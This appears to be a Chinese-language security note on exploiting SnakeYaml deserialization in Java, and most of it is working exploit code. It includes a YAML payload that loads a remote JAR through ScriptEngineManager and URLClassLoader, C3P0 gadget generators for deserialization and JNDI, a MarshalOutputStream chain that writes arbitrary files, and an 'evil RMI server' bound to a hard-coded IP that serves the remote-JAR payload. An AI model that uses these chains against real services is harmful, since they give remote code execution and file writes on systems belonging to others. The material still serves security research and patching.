# SnakeYaml 利用
## 原理

```java
String payload =
    "!!javax.script.ScriptEngineManager [\n" +
    "  !!java.net.URLClassLoader [[\n" +
    "    !!java.net.URL [\"http:/ip/yaml-payload.jar\"]\n" +
    "  ]]\n" +
    "]";
Yaml yaml = new Yaml();
yaml.load(payload);
```

触发的 sink 为构造方法 `<init>` 和 `setter`。

在上面的例子中，可以通过 `ScriptEngineManager` 的 `<init>` 进入 SPI 流程触发 `next()` 远程加载恶意类触发。

```java
/**
    * Dependencies: null
    *
    * ScriptEngineManager <init>
    *  -> next()
    *    -> SPI
    *      -> [Self Class] implements ScriptEngineFactory <init>
    */
```

如果是 call `setter` 需要使用以下方式构造: 

```yaml
!!test.snakeyaml.User { name: SilentE }
# or
!!test.snakeyaml.User
  name: SilentE
```

并且要满足字段可见性不是 `public` (若是 `public` 那么 snakeyaml 会走反射赋值而不是 `setter`)。

如果是 call `constructor` 需要使用以下方式构造: 

```yaml
!!test.snakeyaml.User [ !!str SilentE ]
# or
!!test.snakeyaml.User 
  - SilentE
```

需要保证该类有相应的 constructor 方法。

## 一些链子

其实可以看出 `setter` 和构造方法来做为入口，可以考虑 FastJson 相关的利用。

### C3P0

```java
/**
    * Dependencies: com.mchange:c3p0:0.9.5.2
    *
    * com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase <setter>
    *  -> VetoableChangeSupport#fireVetoableChange
    *      -> WrapperConnectionPoolDataSource$1#vetoableChange
    *        -> C3P0ImplUtils#parseUserOverridesAsString
    *          -> [static] SerializableUtils#deserializeFromByteArray
    *            -> readObject
    */
public String C3P0PoolDataSource(String hexStr) {
    return String.format(
            "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
            "  userOverridesAsString: 'HexAsciiSerializedMap:%s;'"
            , hexStr);
}

/**
    * Dependencies: com.mchange:c3p0:0.9.5.2
    *
    */
public String C3P0JNDIRefForwardingDataSource(String url) {
    return String.format(
            "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
            "  jndiName: \"%s\"\n" +
            "  loginTimeout: 0", url);
}
```

### WriteFile

```java
/**
    * Dependencies: null
    *
    * MarshalOutputStream <init>
    *   -> ObjectOutputStream <init>
    *     -> ObjectOutputStream#setBlockDataMode
    *       -> ObjectOutputStream#drain
    *         -> write
    */
public String WriteFile(String path, String b64Content) {
    return String.format("!!sun.rmi.server.MarshalOutputStream [\n" +
            "  !!java.util.zip.InflaterOutputStream [\n" +
            "    !!java.io.FileOutputStream [\n" +
            "      !!java.io.File [\"%s\"],\n" +
            "      false," +
            "    ],\n" +
            "    !!java.util.zip.Inflater { input: !!binary %s },\n" +
            "    114514\n" +
            "  ]\n" +
            "]"
            , path, b64Content);
}
```

### ReadFile

### JNDI

太多了，以后慢慢补，先来个高版本 JNDI 本地工厂类打 snakeyaml：

```java
public class Service {  
    public static void main(String[] args)throws Exception {  
        System.setProperty("java.rmi.server.hostname","8.142.104.78");  
        System.out.println("[*]Evil RMI Server is Listening on port: 6666");  
        Registry registry = LocateRegistry.createRegistry( 6666);  
        ResourceRef ref = tomcat_snakeyaml();  
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  
        registry.bind("calc", referenceWrapper);  
    }  
    public static ResourceRef tomcat_snakeyaml(){  
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",  
                true, "org.apache.naming.factory.BeanFactory", null);  
        String yaml = "!!javax.script.ScriptEngineManager [\n" +  
                "  !!java.net.URLClassLoader [[\n" +  
                "    !!java.net.URL [\"https://ip/yaml-payload.jar\"]\n" +  
                "  ]]\n" +  
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));  
        ref.add(new StringRefAddr("a", yaml));  
        return ref;  
    }  
}
```

To be continue...

## 参考

- [Java SPI 机制](https://pdai.tech/md/java/advanced/java-advanced-spi.html)
- [Snake Yaml](https://tttang.com/archive/1815)
- [FastJson 相关](https://github.com/safe6Sec/Fastjson)
- [高版本 JDK 下 JNDI 漏洞的利用](https://tttang.com/archive/1405/)